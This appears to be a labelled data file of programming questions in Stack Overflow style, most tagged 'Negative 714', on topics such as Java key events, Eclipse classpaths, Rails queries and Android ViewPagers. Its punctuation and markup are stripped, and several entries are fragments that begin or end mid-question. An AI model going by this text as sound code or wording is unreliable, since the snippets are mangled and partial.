Negative 714 pIm using Robot class and KeyEvent key codes to generate all the other key events and they work fine, but I also need Hangul keytoggle Korean keyboard. Apparently KeyEvent does not have a key code for this key, so Im stuck  Is there a way to generate this Hangul key event Is there a way to use the Windows key code like VKHANGUL 0x15 instead of the KeyEvent key codes If thats possible changing all the key codes wouldnt be a problem... Or somehow take the key event once and store it permanently somewhere and use that forever...p  pWhat I am trying to do is creating an onscreen keyboard that has numbers, alphabets and Korean. Click on an icon and it will generate the key event of the corresponding letter so the letter is typed. Everything except switching to Korean is working properly.p  pBeing able to generate the Hangul key event would be nice but if thats not possible, is there any suggestions on how I could achieve this Maybe I could bind each Korean letter with corresponding alphabet on keyboardfor example g is  on conventional keyboards that have both Eng and Korean or something but then how do I send it to other applicationsp  pSorry if this question is so all over the place. Im just really lost.p

Negative 714 pI know that there is a Git plugin for Eclipse Egit, but I like to do Git stuff on the command line, and I like to code in Eclipse, so I want to keep them separate.p  pI cloned a Git repo I dont think its important, but for good measure, it was codehttpsgithub.comspinscaledropwizardjobs.gitcode. I then opened up Eclipse Juno and created a new Java project, and selected the root of the cloned repo as the base path to my project. Eclipse asked me if I wanted to associate the project with the Java facet, and I clicked OK.p  pThis project has a large dependency tree if you like, check out its 4 POM files. I dont use Maven to build I use Gradle so I just ran a script that resolves the dependencies of these POMs into a directory, and then I created a codelibcode directory in this Eclipse project and copied all the JARs into it. I then added all these JARs to the projects classpath.p  pI am now seeing 10 errors in the strongProblemsstrong view in Eclipse, and theyre all similar errorsp  ul liThe type ApplicationStartTestJob is already defined ApplicationStartTestJob.java dropwizardjobsdropwizardjobscoresrctestjavadespinscaledropwizardjobs    line 10 Java Problemli liThe type ApplicationStartTestJob is already defined ApplicationStartTestJob.java dropwizardjobsdropwizardjobsguicesrctestjavadespinscaledropwizardjobs   line 10 Java Problemli li8 more all like this, etc.li ul  pSure enough, when I expand the entire project, I see it has the following structurep  precodedropwizardjobs     dropwizardjobscore         srctestjava             de.spinscale.dropwizard.jobs                 ApplicationStartTestJob.java     dropwizardjobsguice         srctestjava             de.spinscale.dropwizard.jobs                 ApplicationStartTestJob.java     dropwizardjobsspring         srctestjava             de.spinscale.dropwizard.jobs                 ApplicationStartTestJob.java codepre  pSo it seems that the maintainers of this project like to rename their unit tests with the exact same packageclass names, and for some reason, Eclipse sees them as all belonging inside the same package. To test this I renamed codedropwizardjobscoresrcmainjavade.spinscale.dropwizard.jobs.ApplicationStartTestcode to something else, and did the same for codedropwizardjobsguicesrcmainjavade.spinscale.dropwizard.jobs.ApplicationStartTestcode and sure enough, all the errors associated with codeApplicationStartTestcode being already defined went away.p  pstrongSo my suspicion is confirmedstrong The emintentionem of these subfolders codedropwizardjobscorecode, codedropwizardjobsguicecode and codedropwizardjobsspringcode is that they are emsubprojectsem with separate classpaths. Eclipse thinks all of these source folders are part of the same project, and so it is lumping all of their classes into the same classpath. Since each subproject uses the same unit test naming conventions same packageclass names for each subproject, Eclipse see multiple classes in the same package as having the same name.p  pOK, good I figured out the problem. strongBut whats the solutionstrong Ideally I would be able to keep all of these inside the same project, but perhaps modify the code.classpathcode file or do something similar that instruct Eclipse to keep the subprojects separated from a classpath perspective. Any ideasp

Negative 714 pIm writing a Rails API on top of a legacy database with tons of tables. The search feature gives users the ability to query around 20 separate columns spread across 13 tables. I have a number of queries that check the params to see if they need to return results. They look like thisp  precoderesults ltlt Company.wherecity LIKE , params[city].selectid unless params[city].blank     codepre  pand they work fine. However, I just added another query that looks like thisp  precoderesults ltlt Company.joinsJOIN Contact ON Contact.companyid  Company.id.whereContact.firstname LIKE , params[firstname].selectcompanyid unless params[firstname].blank     codepre  pand suddenly my first set of queries started returning null, rather than the list of IDs they had been returning. The query with the join works perfectly well whether the other queries are functional or not. When I comment the join query out, the previous queries start working again.

Negative 714 pSo, Im attempting to make a web app with the Chrome Dev Editor and Dart on windows. I had to download the Dart sdk, as Pub Get doesnt work straight from the Chrome Dev Editor, so this is what I do in cmdp  precodecd ProjectName ..dartsdkbinpub get     codepre  pEverything looks to run perfectly and pub says it completed everything successfully, however when I look into one of the packages that should have been linked, all I get is an empty folder, but when I look into Pubs cache, everything is present.p  pI went ahead and copied everything manually, but thats going to get very annoying when I need to add more packages. Any ideasp  pEDIT After tinkering a bit more, I found that if I deleted what was in Pubs cache, everything worked properly. Dont know if Im going to run into this issue for a future app, however.p

Negative 714 pThere is this game inspired by Boggle about solving grid word puzzles where the letters of several secret words are placed seemingly randomly on a grid, but each words letters are chained, the user being able to trace each word with a continuous line without taking the finger off screen. So the next letter in one word is neighbouring the preceding letter either on NWSE or on the diagonals.p  pFor instance, for the words WORD and BRAIN, a puzzle grid could bep  precodeD A B R R I W O N codepre  pwhere to spell WORD youd start from W, move east to O, then northwest to R, then north to Dp  precodeD  R  W O codepre  pand, to spell BRAIN, youd start from the B, then go southwest to the center R, then north to A, southeast to I and finally south to N.p  precode  A B   R I     N codepre  pThis is like reversed boggle, where only the puzzles secret words are used in the grid, with no extra letters except, depending on the number of letters in the words, some filler white tiles  which we can ignore for the sake of the question.p  pI have read the a hrefhttpstackoverflow.comquestions23510229whichalgorithmwouldbebestforwordsearchgamesimilarwithboggleothera postsabout a hrefhttpstackoverflow.comquestions14191889whichalgorithmwouldfitbesttosolveawordsearchgamelikebogglewithpyalgorithmsa for solving this kind of game, but my question is, instead, on how I could go about to generate such puzzles  solvable shuffled grids with only letters from my initial words.p  pI guess I could start with the trivial case of simply writing the words in sequence, rotating the letter matrix andor making some simple cell permutations swapping cells on two neighbouring lines  columns in order for the word to zig zag. p  pBut I was wondering if theres a generating algorithm I could use other than brute force randomly shuffling letters around until I find one  particular grid thats solvable.p

But this style is the default from the Owl Carousel jQuery and it must be used so its impossible to change it if removed, it will destroy the layout for this carousel.p  pMy other finding was the codepositionfixedcode in the .headerbottom also has a role in this bug. When changed back to relative, its back to normal, not clipped. BUT, the client wants the header stay position fixed as visitor scroll the website down.

Negative 714 pI have an extended FragmentPagerAdapter that provides 3 fragments to a ViewPager, giving me 3 pages that I can either swipe between or use the tabs Ive added to the actionbar to manually choose a page.p  pId like to temporarily disable the user from accessing the final page a more generalized solution to disable any specific page would also be interesting, but not necessary with either navigation type. I will then reenable their access with a callback from one of the fragments.p  pIve read through answers to some similar questions about not allowing swiping by overriding onTouchEvent and onInterceptTouchEvent, and then using some custom gesture detection within those, or even a half solution using beginFakeDrag. p  pMy current solution simply sets a smaller item count in the adapter, making sure to use notifyDataSetChanged, and changes it back when necessary. Are there any elegant alternatives to these approaches, maybe one that doesnt require changing the datasetp  pI also see that ActionBar.Tab doesnt have a setEnable method, and most suggest to just remove the tab. Is there a way I can have a tab remain visible but not selectable My approach has been to define which tab is disabled and reselect the previously selected tab if the user selects the disabled one.p  pstrongEditstrong I aim to disable both tabbing and swiping to the last page.p

Can some one advise me on how to adapt this for smaller images Also I have a strong preference to do this with out adding css and if thats not possible Id like to find a minimally invasive solution.p  pa hrefhttpsjsfiddle.netDTcHh7620 relnofollowfiddleap  phtmlp  precodeltdiv classcontainergt   ltdiv classrowgt      ltdiv classcolxs6gt       lta classthumbnail hrefhttpwww.google.comgtltimg classimgresponsive imgrounded srchttpwww.opart.co.ukopartgalleryvaralbumsyouropartGDHarleyOPART2311.jpgm1382213140 gtltagt     ltdivgt      ltdiv classcolxs6gt       lta classthumbnail hrefhttpwww.google.comgtltimg classimgresponsive imgrounded srchttpwww.opart.co.ukopartgalleryvaralbumsyouropartGDHarleyOPART2311.jpgm1382213140 gtltagt     ltdivgt    ltdivgt    ltdiv classrowgt     ltdiv classcolxs6gt       lta classthumbnail hrefhttpwww.google.comgtltimg classimgresponsive imgrounded srchttpdavidsimpson.mewpcontentuploads201404icon1281.png gtltagt     ltdivgt     ltdiv classcolxs6gt       lta classthumbnail hrefhttpwww.google.comgtltimg classimgresponsive imgrounded srchttpdavidsimpson.mewpcontentuploads201404icon1281.png gtltagt     ltdivgt   ltdivgt ltdivgt codepre
Negative 714 pI have a two view controllers. One is the root VC and contains my UI interface such as the record button. On this view controller, I also display the view of another VC at index 0. This view contains a AVCaptureVideoPreviewLayer.p  pI would like my video camera to mimic the Apple video camera app, where the interface layout adjusts with the rotation, but the video preview layer does not. You can see how to recording timer UILabel in the stock video app disappears and reappears at the top depending on the orientation.p  pAny idea how to do this I found one suggestion that recommended adding the preview to the app delegates window, since it wont conform to the rotation of the nav controller, but it didnt work for me. p  pThanksp

Negative 714 pI am trying to build a form with about 10 different text fields, switches and labels for iPad and iPhone. In doing so, I want to use AutoLayout with UIScrollView so that it could work well in both iPhoneiPad and portraitlandscape. What I found out is that it would take an hour or two to set up all the autolayout correctly for all devices. p  pI have also tried to use UITableView and I only need to setup 1 or 2 cell for all the AutoLayout to work properly. The tradeoff is that managing a table view is quite harder than a scroll viewp  pI am not sure if anybody has a better way to set up these kinds of form and lessons they have learnt in doing sop

Negative 714 pI am currently building an applications UI without using IB or storyboard. I have the following hierarchy   1. ViewController which is the main view controller.   2.

Negative 714 pstrongGood evening everyonestrong,p  pI am sorry to ask such a question, but my knowledge on the particular subject is not strong, and I tried hard to search both here and on Google, but it appears that I know the wrong keywords, or perhaps I just missed it when I found it.p  pI would like to achieve an effect that can be shown whenever a webpage like the ones here, is loadedp  pa hrefhttpwww.birradelleremo.it relnofollow titleBirra Dell39EremoBirra DellEremoap  pa hrefhttpjurajmolnar.com relnofollowJuraj Molnrap  pa hrefhttpwww.palzileri.com relnofollowPal Zileriap  pAs you can see, the webpages and the subpages of the website are all loaded behind a preloader, in some cases an image, in others an SVG, no matter.p  pI would like to know, or at least be pointed to, a good tutorial and way to learn such a thing. I am not only interested in the loader tho, because I did find some resources about the preloading process.p  pWhat really interests me is how those webpages, among many others, use loaders to asynchronously load content into the page, strongmaking it feel native and realtime each time you change a page from the menustrong.p  pIs it all about using the loader both on arrival and departure from a webpagep  pIs it fast and feels real time because the first time you change web page with the menu, the loader image and a few css rules were cached in the browserp  pHow does it work, where can I look for it Which are the strongkeywordsstrongp  pThank you very much for your patience, I do hope I will not get downvoted for asking such a trivial question, but I had to ask, because I could not reach an answer on my own.p  pstrongEDITstrong I might not be the clearest person in my explanation, and for that I ask of you to forgive me, but the effect that I am trying to find the loading effect both on entrance and exit from pages should also send you to the new page, and not load content with AJAX in a predefined DIV or any tag. I heard about the usage of the history API, but that is not what I am looking for.p  pstrongEDIT IIstrong So far no answer has been given, and I wasnt able to find any good answer aswell on the internet, possibly for my lack of keyword knowledge, I presume. I will try to do a loader that works both on load and unload of the page will let you know as soon as Im done. Thank you again.p  pThanks again.p

Negative 714 pIm working with C ASP.NET Web Application. There is a problem that is difficult to track in the code.  Lets say I have two buttons emUploadem which uploads some data from DataTable to Database and emCancelem which cancels the uploading process. The problem is that uploading process runs in the BackgroundWorker. When user clicks emUploadem and uploading starts and then he clicks emCancelem the emCancelButtonClickem event does not fire until BackgroundWorker is uploading data.p  pI have code like thisp  precodeprotected void PageLoadobject sender, EventArgs e      backgroundWorker1.ProgressChanged  new System.ComponentModel.ProgressChangedEventHandlerbackgroundWorker1ProgressChanged     backgroundWorker1.RunWorkerCompleted  new System.ComponentModel.RunWorkerCompletedEventHandlerbackgroundWorkerRunWorkerCompleted   protected void UploadButtonClickobject sender, EventArgs e  backgroundWorker1.RunWorkerAsync   protected void CancelButtonClickobject sender, EventArgs e  backgroundWorker1.CancelAsync   private void backgroundWorker1ProgressChangedobject sender, ProgressChangedEventArgs e   codepre  pSo what really happens is when you click emUploadem and emCancelem is method emprivate void backgroundWorker1ProgressChangedem runs many times one time for every row of data, I suppose and ONLY THEN method emCancelButtonClickem runs.p  pWhat to do, if I want to stop data uploading right after emCancelem button is clickedp  pThaaaanks p  pP.S.

Negative 714 pI have developed a header with HTML. When you scroll more then 25px, the class codefixedcode is added to the header with jQuery.

This is working, and after 25px it will scroll with you, but as you can see, the content will jump to above, because the height of the header is not anymore coderelativecode to the rest.p  pHence my question. How to solve this problem so that the content remains in its original position, preferably without using absolute positioning.p  pI tried to add the class codefixedcode to the body element and then call in my css the main part and add a margintop to the main element, but then, When you scroll down and up, the main content is getting to low.p
Negative 714 pGreetings SO community     I have a REST, jersey based, application. This applicationdue to nature of its clients receives same http requests 36 of them at roughly the same time 25s apart. Each request takes around 10s to process and brings back a ton of data hitting DB, doing data massaging etc. In an ideal world Id like to avoid having to process the same request multiple times and was thinking of coding some sort of request filter that would only allow unique requests go through, whist others would be blocked until such time when the allowed one returns.  Blocked requests would also then return the same data to the caller by looking up cached response on the serverp  pWhat are the proscons of this approach Are there any better solutions to this other than changing client logic p

For example, I want bolded and italicized text to be fontsize 115, while keeping them individually at 105p

Negative 714 pIn my project Im using React and Babel so I use some ES6 features but mainly those used by React. Webstorm gives me option to mark my syntax either as ES6 or JSX Harmony and I got confused. p  pI think I know what ES6ES2015 is and how to use it with a compiler, eg. Babel. p  pThe hard part id JSXJSX Harmony. I know that React uses JSX butp  ol lipIs this the same JSX as a hrefhttpsjsx.github.io relnofollowherea If not, which JSX is meant by JSX Harmony option in Webstormpli lipIve seen the compatibility page mentioned a hrefhttpstackoverflow.comquestions27414384whates6featuresaresupportedinjsxherea and know that JSX Transformer supports only small part of ES6 but also that apparently Babel supports JSX as an addition to ES6 support so JSX seems to be more than ES6 subset... If so, what features of JSX React or JSX Harmony are not part of ES6 specs pli ol  h3EDITh3  pAs for question 1 Im getting sure these are two completely different things. But what is JSX Harmony then p  h3EDIT 2h3  pTo answer my own question Webstorm JSX Harmony refers most probably to the syntax supported by React JSX Compiler with harmony flag on  adding a bit of ES6 support.p
